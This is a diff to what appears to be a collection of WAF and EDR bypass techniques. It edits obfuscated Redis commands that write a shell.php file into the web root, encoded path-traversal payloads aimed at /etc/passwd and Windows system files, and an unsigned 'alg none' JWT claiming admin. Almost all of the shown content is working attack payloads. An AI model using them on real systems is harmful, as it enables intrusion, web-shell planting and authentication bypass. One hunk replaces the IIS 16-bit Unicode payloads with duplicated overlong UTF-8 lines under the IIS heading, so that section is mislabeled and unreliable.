@@ -154,9 +154,9 @@ Comprehensive collection of WAF and EDR bypass techniques organized by vulnerabi
 ### Redis Command Obfuscation
 
 ```bash
-# Quote-splitting to bypass command word detection
+# Use hex escape sequences to bypass command word detection
 redis-cli -h target
-> "C""O""N""F""I""G" SET dir /var/www/html/
+> \x43\x4f\x4e\x46\x49\x47 SET dir /var/www/html/
 > $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php
 
 # Lua script execution to bypass direct command monitoring
@@ -435,9 +435,9 @@ http://[64:ff9b:1::c000:0201]/ # bypass via NAT64 prefix
 ..%c0%af..%c0%afetc/passwd
 ..%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 
--- 16-bit Unicode (IIS)
-..%u2216..%u2216etc/passwd
-..%uff0f..%uff0fetc/passwd
+-- 16-bit Unicode (IIS, legacy)
+..%c0%af..%c0%afetc/passwd
+..%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 
 -- Backslash (Windows)
 ..\..\..\windows\system.ini
@@ -479,7 +479,7 @@ jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")
 ### Token Obfuscation
 
 ```json
-// Remvoe signature
+// Remove signature
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
 
 // Unicode normalize header
